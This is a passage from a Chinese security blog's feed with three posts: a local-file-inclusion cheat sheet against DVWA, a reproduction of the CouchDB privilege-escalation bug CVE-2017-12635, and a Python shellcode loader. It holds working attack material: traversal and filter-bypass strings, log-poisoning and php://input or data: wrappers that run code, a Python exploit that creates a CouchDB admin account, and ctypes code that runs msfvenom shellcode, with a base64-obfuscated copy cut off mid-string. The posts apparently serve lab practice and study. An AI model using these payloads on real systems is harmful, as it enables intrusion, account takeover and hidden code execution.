    </entry>
    
    <entry>
      <title>Local file contains a summary of the vulnerability</title>
      <link href="/posts/f915f25f.html"/>
      <url>/posts/f915f25f.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前整理的忘记发博客了，现在补上<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181128/8f6aa11d22fe4ab09ce48bf8ada2406f.jpeg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h4 id="本地文件包含总结"><a href="#本地文件包含总结" class="headerlink" title="本地文件包含总结"></a>本地文件包含总结</h4><p><b>漏洞概述</b><br>文件包含是PHP的一个功能，可以包含php文件并运行，或者调用被包含的PHP文件里面的函数。但是由于未对用户可控变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server将特定文件当做php执行，从而导致用户可以获取一定的服务器权限。</p><p><b>漏洞代码如下</b><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><b>攻击手法如下</b><br>知道绝对路径下可以直接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=I:/phpstudy/PHPTutorial/WWW/dd.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/03/kGTTmR.png" alt="kGTTmR.png"></p><p>不知道绝对路径下你可以这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=/../../../../../phpstudy/PHPTutorial/WWW/dd.txt</span><br></pre></td></tr></table></figure></p><p>用/../../../../../为相对路径获取<br><img src="https://s2.ax1x.com/2019/02/03/kGTjpD.md.png" alt="kGTjpD.md.png"></p><p>log文件getshell：<br>利用条件：先看看一些指定的日志文件有没有权限读取，如果有的话就可以getshell了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.通过扫描出的端口判断有哪些log</span><br><span class="line">2.通过web容器得到对应的log文件</span><br></pre></td></tr></table></figure></p><p>有权限读取Apache的log文件或错误log文件，就是error.log我这里用的是error.log<br><img src="https://s2.ax1x.com/2019/02/03/kG7E9S.md.png" alt="kG7E9S.md.png"></p><p>在url框写入的内容会被记录到log,那么直接写一句话即可，这里写phpinfo测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/&lt;?php phpinfo();?&gt; 会被记到log文件，然后通过文件包含log文件即可执行</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/03/kG7Nu9.md.png" alt="kG7Nu9.md.png"></p><p>常见的log文件有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apache的log apache.log error.log</span><br><span class="line">系统运行的log ftp.log ssh.log</span><br><span class="line">其他服务的log</span><br></pre></td></tr></table></figure></p><p>包含session文件<br>利用条件：session文件路径已知，且其中内容部分可控<br>php的session文件的保存路径可以在phpinfo的session.save_path看到<br><img src="https://s2.ax1x.com/2019/02/03/kGHdMQ.md.png" alt="kGHdMQ.md.png"><br>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码<br>好像没多少人成功= =</p><p>包含environ<br>要求：php以cgi方式运行，这样environ才会保持UA头，environ文件存储位置已知，且environ文件可读。<br>用法：<br>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><p>包含fd<br>方法过于复杂<br>参考：<a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="noopener">shell via LFI - proc/self/environ method</a></p><p>包含上传的文件<br>要求：知道上传的文件名<br>例如这里叫xx.jpg<br><img src="https://s2.ax1x.com/2019/02/04/kJ1O1I.png" alt="kJ1O1I.png"></p><p>包含临时文件<br>php在处理文件上传的时候会先创建一个临时文件<br>条件竞争漏洞+文件包含漏洞</p><p><b>伪协议的利用</b><br>协议：php//filer<br>要求：无<br>用法：base64编码读到的内容，php://filter/convert.base64-encode/resource=文件路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=被包含的文件路径</span><br><span class="line">例如http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/../../../../../Apache/logs/error.log</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/03/kGHp2F.md.png" alt="kGHp2F.md.png"></p><p>协议：php://input<br>要求：allow_url_include=On,对allow_url_fopen不做要求<br>用法：在存在包含漏洞的请求变量输入php://input 然后用burp抓包，添加你要执行的代码<br><img src="https://s2.ax1x.com/2019/02/04/kJl9r8.md.png" alt="kJl9r8.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/04/kJQ481.png" alt="kJQ481.png"></p><p>协议：php://phar或者zip://<br>要求：php版本等于大于5.3.0<br>用法：创建一个压缩包，然后里面添加个txt，txt里面是php代码。然后在存在包含漏洞的请求变量输入php://rar/压缩包名/压缩包里面的txt<br>注意：windows下必须得知道绝对路径才能使用此协议，而Linux下可以使用相对路径<br><img src="https://s2.ax1x.com/2019/02/04/kJlnMV.md.png" alt="kJlnMV.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/04/kJlRL8.png" alt="kJlRL8.png"></p><p><img src="https://s2.ax1x.com/2019/02/04/kJlqyV.png" alt="kJlqyV.png"></p><p>data:URI schema</p><p>协议名：dataURl schema<br>要求：php版本大于等于php5.2，allow_url_fopen = On，allow_url_include = On<br>用法：在存在包含漏洞的请求参数，输入data:text/plain,&lt;?php 代码 ?&gt;<br><img src="https://s2.ax1x.com/2019/02/04/kJ1AeO.png" alt="kJ1AeO.png"></p><p>执行命令<br><img src="https://s2.ax1x.com/2019/02/04/kJ1EwD.png" alt="kJ1EwD.png"></p><p>以bas64的方式来执行<br>data:text/plain;base64,base64编码的代码<br><img src="https://s2.ax1x.com/2019/02/04/kJ1mYd.png" alt="kJ1mYd.png"></p><p><b>绕过过滤</b><br>指定前缀<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">'I:\phpstudy\PHPTutorial\WWW'</span>.$_GET[<span class="string">'file'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>绕过方式：<br>使用相对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/bh.php?file=/../../../../../1.txt</span><br></pre></td></tr></table></figure></p><p>路径结合起来就是：I:\phpstudy\PHPTutorial\WWW/../../../../../1.txt<br>1txt在I盘根目录，内容是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16022d6f9581b14aabd64f1476e6bd1a8e119a3a</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/04/kJ81Ig.png" alt="kJ81Ig.png"></p><p>包含如下：<br><img src="https://s2.ax1x.com/2019/02/04/kJ88iQ.png" alt="kJ88iQ.png"></p><p>过滤../<br>绕过方式：编码绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">../</span><br><span class="line">%2e%2e%2f</span><br><span class="line">..%2f</span><br><span class="line">%2e%2e/</span><br><span class="line">..\</span><br><span class="line">%2e%2e%5c</span><br><span class="line">..%5c</span><br><span class="line">%2e%2e\</span><br><span class="line">二次编码</span><br><span class="line">../</span><br><span class="line">%252e%252e%252f</span><br><span class="line">..\</span><br><span class="line">%252e%252e%255c</span><br></pre></td></tr></table></figure></p><p>指定后缀<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">'file'</span>].<span class="string">'dd.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>远程文件包含漏洞+？或#绕过<br><img src="https://s2.ax1x.com/2019/02/04/kJGlOx.png" alt="kJGlOx.png"></p><p><img src="https://s2.ax1x.com/2019/02/04/kJG3m6.png" alt="kJG3m6.png"></p><p>利用zip协议<br>注意：这里要用绝对路径,注意压缩包里面的路径<br>拼接后的路径是I:\phpstudy\PHPTutorial\WWW\demo.zip#dd.txt<br>导致能够成功绕过<br><img src="https://s2.ax1x.com/2019/02/04/kJJ8vn.png" alt="kJJ8vn.png"></p><p>第二个例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&apos;file&apos;]))&#123;</span><br><span class="line">    include $_GET[&apos;file&apos;].&apos;WWW/dd.txt&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/04/kJY9rq.png" alt="kJY9rq.png"></p><p><img src="https://s2.ax1x.com/2019/02/04/kJJzxs.md.png" alt="kJJzxs.md.png"></p><p>或者用%00截断，不过有些php版本不行</p><p><b>漏洞修补</b><br>设置php.ini里面的allow_url_inclue=Off,allow_url_fopen=off<br>不要让参数可以控制文件包含，如果非要控制的话。就用str_replace()过滤掉.和/那么<br>这两个过滤之后利用也不可能成功了。然后在手动给参数加上.</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2017-12635 recurrence</title>
      <link href="/posts/c0c88449.html"/>
      <url>/posts/c0c88449.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复现CVE-2017-12635,今天是大年初一。祝大家新年快乐，个人喜好一个人待在房间里写码，日站过不过年感觉没什么感觉吧<br><img src="https://p.ssl.qhimg.com/t013e381f5ee009a47e.jpg?size=500x281" alt="t013e381f5ee009a47e.jpg?size=500x281"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>漏洞介绍</b><br>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）<br>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><p>参考链接：</p><p><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a><br><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></p><p><b>环境搭建</b><br>进入对应的CVE文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>搭建好之后访问：<a href="http://127.0.0.15984/_utils/#" target="_blank" rel="noopener">http://127.0.0.15984/_utils/#</a>  ,会出现如下图所示<br><img src="https://s2.ax1x.com/2019/02/05/kY1Kvq.png" alt="kY1Kvq.png"></p><p>我们并不知道账号密码，所以无法登陆</p><p><b>漏洞复现</b></p><p>首先，发送如下数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可见，返回403错误：{“error”:”forbidden”,”reason”:”Only _admin may set roles”}，只有管理员才能设置Role角色：<br><img src="https://s2.ax1x.com/2019/02/05/kY1HiQ.md.png" alt="kY1HiQ.md.png"></p><p>发送包含两个roles的数据包，即可绕过限制：<br><img src="https://s2.ax1x.com/2019/02/05/kY1bGj.md.png" alt="kY1bGj.md.png"></p><p><b>利用代码</b><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:九世</span></span><br><span class="line"><span class="comment">#time:2019/2/5</span></span><br><span class="line"><span class="comment">#source:https://vulhub.org/#/environments/couchdb/CVE-2017-12635/</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cve_2017_12635</span><span class="params">(urlq,username,password)</span>:</span></span><br><span class="line">    urls=str(urlq).strip()+<span class="string">'/_users/org.couchdb.user:&#123;&#125;'</span>.format(username)</span><br><span class="line">    headers=&#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span>,<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">    payload = <span class="string">'&#123;"type": "user", "name": "'</span>+username</span><br><span class="line">    payload += <span class="string">'", "roles": ["_admin"], "roles": [],'</span></span><br><span class="line">    payload += <span class="string">'"password": "'</span> + <span class="string">'&#123;&#125;'</span>.format(password)+ <span class="string">'"&#125;'</span></span><br><span class="line">    print(payload)</span><br><span class="line">    rqt=requests.put(url=urls,headers=headers,data=payload)</span><br><span class="line">    <span class="keyword">if</span> rqt.status_code==<span class="number">201</span>:</span><br><span class="line">        print(<span class="string">'[+] username:&#123;&#125;\n[+] password:&#123;&#125;'</span>.format(username,password))</span><br><span class="line">    <span class="keyword">elif</span> rqt.status_code==<span class="number">409</span>:</span><br><span class="line">        print(<span class="string">'[-] Not Found CVE-2017-12635'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[-] rqt_status_code:&#123;&#125;'</span>.format(rqt.status_code))</span><br></pre></td></tr></table></figure></p><p>测试：<br><img src="https://s2.ax1x.com/2019/02/05/kY1XMq.md.png" alt=""></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python exec shellcode</title>
      <link href="/posts/a3f2d98a.html"/>
      <url>/posts/a3f2d98a.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里我先吐槽一下，网上用中文搜的python执行shellcode。全部是复制粘贴，棒的我不知道如何下手<br>然后今天早上@即刻安全-Yansu老哥帮我整出来了。老板喝茶<br><img src="http://tama-yura.jp/animetory/img/entries/52846dbee7b659d2ab96736ffaa6ab8d4d8e24d0/53ad87b62d957/pc/15.jpg" alt="15.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>代码我理解不了多少，可能还有错的<br>获取shellcode<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=calc.exe -f py -o /root/demo.py</span><br></pre></td></tr></table></figure></p><p>执行shellcode代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"</span></span><br><span class="line">buf += <span class="string">b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"</span></span><br><span class="line">buf += <span class="string">b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"</span></span><br><span class="line">buf += <span class="string">b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"</span></span><br><span class="line">buf += <span class="string">b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"</span></span><br><span class="line">buf += <span class="string">b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"</span></span><br><span class="line">buf += <span class="string">b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"</span></span><br><span class="line">buf += <span class="string">b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"</span></span><br><span class="line">buf += <span class="string">b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"</span></span><br><span class="line">buf += <span class="string">b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"</span></span><br><span class="line">buf += <span class="string">b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"</span></span><br><span class="line">buf += <span class="string">b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"</span></span><br><span class="line">buf += <span class="string">b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"</span></span><br><span class="line">buf += <span class="string">b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"</span></span><br><span class="line">buf += <span class="string">b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span></span><br><span class="line">buf += <span class="string">b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"</span></span><br><span class="line">buf += <span class="string">b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"</span></span><br><span class="line">buf += <span class="string">b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"</span></span><br><span class="line">buf += <span class="string">b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"</span></span><br><span class="line">buf += <span class="string">b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"</span></span><br><span class="line">buf += <span class="string">b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"</span></span><br><span class="line">buf += <span class="string">b"\x78\x65\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这两个微软官方说明是可读可写可执行，PAGE_EXECUTE_READWRITE和VIRTUAL_MEM</span></span><br><span class="line">PAGE_EXECUTE_READWRITE  =  <span class="number">0x00000040</span> <span class="comment">#参数设定</span></span><br><span class="line">VIRTUAL_MEM  =  ( <span class="number">0x1000</span> | <span class="number">0x2000</span> ) <span class="comment">#参数设定</span></span><br><span class="line">buf_arr = bytearray (buf) <span class="comment">#shellcode变为一个新的字节数组</span></span><br><span class="line">buf_size = len(buf_arr) <span class="comment">#计算shellcode的大小</span></span><br><span class="line">kernel32 = ctypes.cdll.LoadLibrary(<span class="string">"kernel32.dll"</span>) <span class="comment">#调用kernel32.dll</span></span><br><span class="line">kernel32.VirtualAlloc.restype = ctypes.c_uint64 <span class="comment">#返回类型为c_uint64</span></span><br><span class="line">sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE) <span class="comment">#设置</span></span><br><span class="line">buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr) <span class="comment">#将shellcode指向指针</span></span><br><span class="line">print(sc_ptr)</span><br><span class="line">print(buf_ptr)</span><br><span class="line">kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),buf_ptr,ctypes.c_int(buf_size)) <span class="comment">#调用dll，指向shellcode</span></span><br><span class="line"></span><br><span class="line">handle = kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                               ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                               ctypes.c_uint64(sc_ptr),</span><br><span class="line">                               ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                               ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                               ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure></p><p>注意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的shellcode是弹计算器的</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/03/kGMR8x.md.png" alt="kGMR8x.md.png"></p><p>如果你觉得长的离谱那么，你可以这样执行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload=B<span class="string">"aW1wb3J0IGN0eXBlcw0KaW1wb3J0IHN5cw0KZnJvbSBjdHlwZXMgaW1wb3J0ICoNCmJ1ZiA9ICBiIiINCmJ1ZiArPSBiIlx4ZmNceDQ4XHg4M1x4ZTRceGYwXHhlOFx4YzBceDAwXHgwMFx4MDBceDQxXHg1MVx4NDEiDQpidWYgKz0gYiJceDUwXHg1Mlx4NTFceDU2XHg0OFx4MzFceGQyXHg2NVx4NDhceDhiXHg1Mlx4NjBceDQ4Ig0KYnVmICs9IGIiXHg4Ylx4NTJceDE4XHg0OFx4OGJceDUyXHgyMFx4NDhceDhiXHg3Mlx4NTBceDQ4XHgwZiINCmJ1ZiArPSBiIlx4YjdceDRhXHg0YVx4NGRceDMxXHhjOVx4NDhceDMxXHhjMFx4YWNceDNjXHg2MVx4N2MiDQpidWYgKz0gYiJceDAyXHgyY1x4MjBceDQxXHhjMVx4YzlceDBkXHg0MVx4MDFceGMxXHhlMlx4ZWRceDUyIg0KYnVmICs9IGIiXHg0MVx4NTFceDQ4XHg4Ylx4NTJceDIwXHg4Ylx4NDJceDNjXHg0OFx4MDFceGQwXHg4YiINCmJ1ZiArPSBiIlx4ODBceDg4XHgwMFx4MDBceDAwXHg0OFx4ODVceGMwXHg3NFx4NjdceDQ4XHgwMVx4ZDAiDQpidWYgKz0gYiJceDUwXHg4Ylx4NDhceDE4XHg0NFx4OGJceDQwXHgyMFx4NDlceDAxXHhkMFx4ZTNceDU2Ig0KYnVmICs9IGIiXHg0OFx4ZmZceGM5XHg0MVx4OGJceDM0XHg4OFx4NDhceDAxXHhkNlx4NGRceDMxXHhjOSINCmJ1ZiArPSBiIlx4NDhceDMxXHhjMFx4YWNceDQxXHhjMVx4YzlceDBkXHg0MVx4MDFceGMxXHgzOFx4ZTAiDQpidWYgKz0gYiJceDc1XHhmMVx4NGNceDAzXHg0Y1x4MjRceDA4XHg0NVx4MzlceGQxXHg3NVx4ZDhceDU4Ig0KYnVmICs9IGIiXHg0NFx4OGJceDQwXHgyNFx4NDlceDAxXHhkMFx4NjZceDQxXHg4Ylx4MGNceDQ4XHg0NCINCmJ1ZiArPSBiIlx4OGJceDQwXHgxY1x4NDlceDAxXHhkMFx4NDFceDhiXHgwNFx4ODhceDQ4XHgwMVx4ZDAiDQpidWYgKz0gYiJceDQxXHg1OFx4NDFceDU4XHg1ZVx4NTlceDVhXHg0MVx4NThceDQxXHg1OVx4NDFceDVhIg0KYnVmICs9IGIiXHg0OFx4ODNceGVjXHgyMFx4NDFceDUyXHhmZlx4ZTBceDU4XHg0MVx4NTlceDVhXHg0OCINCmJ1ZiArPSBiIlx4OGJceDEyXHhlOVx4NTdceGZmXHhmZlx4ZmZceDVkXHg0OFx4YmFceDAxXHgwMFx4MDAiDQpidWYgKz0gYiJceDAwXHgwMFx4MDBceDAwXHgwMFx4NDhceDhkXHg4ZFx4MDFceDAxXHgwMFx4MDBceDQxIg0KYnVmICs9IGIiXHhiYVx4MzFceDhiXHg2Zlx4ODdceGZmXHhkNVx4YmJceGYwXHhiNVx4YTJceDU2XHg0MSINCmJ1ZiArPSBiIlx4YmFceGE2XHg5NVx4YmRceDlkXHhmZlx4ZDVceDQ4XHg4M1x4YzRceDI4XHgzY1x4MDYiDQpidWYgKz0gYiJceDdjXHgwYVx4ODBceGZiXHhlMFx4NzVceDA1XHhiYlx4NDdceDEzXHg3Mlx4NmZceDZhIg0KYnVmICs9IGIiXHgwMFx4NTlceDQxXHg4OVx4ZGFceGZmXHhkNVx4NjNceDYxXHg2Y1x4NjNceDJlXHg2NSINCmJ1ZiArPSBiIlx4NzhceDY1XHgwMCINCg0KI+i/meS4pOS4quW+rui9r+WumOaWueivtOaYjuaYr+WPr+ivu+WPr+WGmeWPr+aJp+ihjO+8jFBBR0VfRVhFQ1VURV9SRUFEV1JJVEXlkoxWSVJUVUFMX01FTQ0KUEFHRV9FWEVDVVRFX1JFQURXUklURSAgPSAgMHgwMDAwMDA0MCAj5Y+C5pWw6K6+5a6aDQpWSVJUVUFMX01FTSAgPSAgKCAweDEwMDAgfCAweDIwMDAgKSAj5Y+C5pWw6K6+5a6aDQpidWZfYXJyID0gYnl0ZWFycmF5IChidWYpICNzaGVsbGNvZGXlj5jkuLrkuIDkuKrmlrDnmoTlrZfoioLmlbDnu4QNCmJ1Zl9zaXplID0gbGVuKGJ1Zl9hcnIpICPorqHnrpdzaGVsbGNv